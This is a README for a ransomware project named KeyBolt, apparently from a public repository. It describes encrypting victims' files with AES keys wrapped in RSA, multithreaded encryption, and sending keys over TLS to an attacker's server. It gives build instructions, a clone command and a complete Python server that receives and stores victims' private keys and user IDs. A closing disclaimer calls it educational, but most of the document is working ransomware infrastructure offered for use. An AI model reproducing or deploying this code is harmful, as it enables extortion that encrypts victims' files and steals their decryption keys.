# KeyBolt Ransomware

## Overview

**KeyBolt** is a sophisticated ransomware application designed to encrypt target files on the victim's system and securely transmit the decryption keys to a remote server. The application employs robust encryption algorithms and multithreading for efficient file processing.

KeyBolt primarily targets files with specific extensions while excluding system directories to minimize detection. It generates unique user identifiers and utilizes public key cryptography for secure key exchange.

## Important Fragments

### File Encryption

KeyBolt utilizes AES (Advanced Encryption Standard) for file encryption. Each file is encrypted with a randomly generated key, which is then encrypted with the victim's public RSA key. The encryption process ensures that only the authorized party can decrypt the files.

```c
void encrypt_file(const char *file_path, const char *public_key) {
    ...
    EVP_SealInit(ctx, EVP_aes_128_cbc(), &encrypted_key, &encrypted_key_len, iv, &pkey, 1);
    ...
}
```

### Multithreading

To improve performance, KeyBolt employs multithreading for file encryption. It divides the workload among several threads based on the number of available CPU cores.

```c
void encrypt_files(char **file_paths, int file_count, const char *public_key) {
    ...
    pthread_create(&threads[i], NULL, encrypt_files_thread, (void *)&thread_data[i]);
    ...
}
```

### Network Communication

KeyBolt securely sends the encrypted decryption keys to a designated server using SSL/TLS. This process ensures that sensitive data is transmitted securely over the network.

```c
SSL *ssl;
...
SSL_write(ssl, ciphertext, ciphertext_len);
```

### Compilation Instructions

KeyBolt is developed in C and requires a Linux environment for compilation. Ensure you have the necessary libraries installed, including OpenSSL and pthread.

#### Prerequisites

- GCC (GNU Compiler Collection)
- OpenSSL Development Libraries
- Pthread Library
- Winsock2 (for network communication on Windows)

#### Steps to Compile

1. Clone the repository:

    ```bash
    git clone https://github.com/s4crifice/keybolt-ransomware.git
    cd KeyBolt
    ```

2. Install required packages:

    On Debian-based systems, use:

    ```bash
    sudo apt-get install build-essential libssl-dev 
    ```

3. Go to scripts/:

    Run the following command in the terminal:

    ```bash
    cd scripts
    ```

4. Run the program:

    ```bash
    ./build_project.sh
    ```

### Example Server

Below is a simple Python server implementation that can be used to receive data from KeyBolt. Ensure you have pycryptodome installed to run this server and decrypt data.

#### Python Server Example

```python
import socket
import ssl
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# AES key and IV must match those used in client
AES_KEY = b'12345678901234567890123456789012'  # 32 bytes for AES-256
AES_IV = b'1234567890123456'                   # 16 bytes for AES block size

def decrypt_aes(ciphertext):
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return decrypted_data

def handle_client_connection(client_socket):
    try:
        encrypted_data = client_socket.recv(4096)
        if not encrypted_data:
            print("No data received")
            return

        print(f"Encrypted data: {encrypted_data}")

        # Decrypt the data
        decrypted_data = decrypt_aes(encrypted_data)
        print(f"Decrypted data: {decrypted_data}")

        json_data = json.loads(decrypted_data.decode('utf-8'))

        # Extract the privateKey and userId
        private_key = json_data.get('privateKey')
        user_id = json_data.get('userId')

        if private_key is None or user_id is None:
            print("Missing fields")
            return

        # Process the data as needed (for now, we just print it)
        print(f"Received privateKey: {private_key}")
        print(f"Received userId: {user_id}")

        # Save the privateKey to a file named after the userId
        with open(f"received_keys/{user_id}.txt", "w") as file:
            file.write(f"privateKey:\n{private_key}\n")
            file.write(f"userId: {user_id}\n")

    except Exception as e:
        print(f"Decryption failed: {e}")

def main():
    server_address = ('0.0.0.0', 443)

    # Create a socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(server_address)
    server_socket.listen(5)
    print(f"Server listening on {server_address}")

    # Wrap the socket with SSL
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile='SSL/server.crt', keyfile='SSL/server.key')
    ssl_server_socket = context.wrap_socket(server_socket, server_side=True)

    while True:
        client_socket, client_address = ssl_server_socket.accept()
        print(f"Connection from {client_address}")
        handle_client_connection(client_socket)
        client_socket.close()

if __name__ == '__main__':
    main()
```

#### Generate SSL certificate

1. Using OpenSSL
    ```bash
    openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes
    ```

2. Move it to the SSL directory
    ```bash
    mv server.crt server.key SSL/
    ```

#### Run the Server

1. Install pycryptodome:

    ```bash
    pip install pycryptodome
    ```

2. Run the server:

    ```bash
    python server.py
    ```

### Disclaimer

KeyBolt is intended for educational purposes only. The authors do not condone the use of ransomware for malicious purposes. Misuse of this software is strictly prohibited and may result in legal consequences.

